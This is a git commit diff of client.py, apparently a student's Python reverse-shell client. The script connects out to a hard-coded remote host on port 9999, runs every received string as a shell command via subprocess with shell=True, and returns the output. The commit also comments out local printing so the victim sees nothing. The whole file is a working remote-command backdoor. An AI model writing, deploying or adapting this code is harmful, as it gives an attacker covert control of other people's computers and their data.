ee88871e7e6d6e86689251b604e420afe1cb7dee
Johnjimy Som <FNS-SA-204-IT2FNS-SA-204-IT2@csulb.edu>
2018-08-28 13:40:42 -0700

    updated client.py, added a debugger for the pipes.

--- client.py
+++ client.py
@@ -9,7 +9,7 @@ import socket #connect to serever
 import subprocess #allows to control of the Operating System onof target machine
 
 s = socket.socket()#compiter can connect to other computers
-host = '###.#.#.#'#target ip
+host = '###.##.###.##'#target ip
 port = 9999
 s.connect((host,port))#bind the network
 
@@ -19,13 +19,14 @@ while True:
     if data[:2].decode("utf-8") == 'cd': #convert byte to string
         os.chdir(data[3:].decode("utf-8"))#os = access operating systrm
     if len(data) > 0:
-        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#open the subpros, open a cmd from a terminal, shell shouldnt be added..
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#omit the shell=True
+        #cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#debugg open the subpros, open a cmd from a terminal, shell shouldnt be added..
         #takes any output puts out to standard string
     output_bytes=cmd.stdout.read()+cmd.stderr.read()
         #output_bytes = cmd.stdout.read()+cmd.strderr.read()
     output_str = str(output_bytes, "utf-8")
     s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
-    print(output_str)#if ur hidoi hito dont print
+    #print(output_str)#if ur hidoi hito dont print
 
 #   close connection
 s.close()
